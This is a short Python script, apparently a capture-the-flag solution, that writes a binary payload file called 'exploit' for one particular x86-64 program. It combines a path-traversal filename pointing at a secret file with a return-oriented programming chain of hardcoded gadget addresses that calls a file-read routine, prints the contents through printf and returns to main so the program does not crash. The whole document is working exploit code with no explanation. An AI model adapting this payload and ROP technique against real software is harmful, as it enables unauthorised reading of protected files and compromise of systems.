#!/usr/bin/env python
from struct import *

buf = b'they_see_me_rollin_they_hatin\0'
buf += b'../etc/evil/vault/world-domination-plan\0'
buf += b'SECRET:%s\0'
buf += b'\0'*8

buf += pack("<Q", 0x4010f3) # pop rdi gadget
buf += pack("<Q", 0x60302e) # our file addr
buf += pack("<Q", 0x400e00) # file_read
buf += pack("<Q", 0x400e54) # file_read mov	rsi, rax
buf += pack("<Q", 0xAAAAAAAAAAAAAAAA) # file_read will pop rbx
buf += pack("<Q", 0xBBBBBBBBBBBBBBBB) # file_read will pop rbx
buf += pack("<Q", 0xCCCCCCCCCCCCCCCC) # file_read will pop rbp
buf += pack("<Q", 0x4010f3) # pop rdi gadget
buf += pack("<Q", 0x603056) # SECRET:%s addr
buf += pack("<Q", 0x400780) # printf
buf += pack("<Q", 0x400800) # main so we don't crash
buf += b'\n'

with open("exploit", "wb") as f:
    f.write(buf)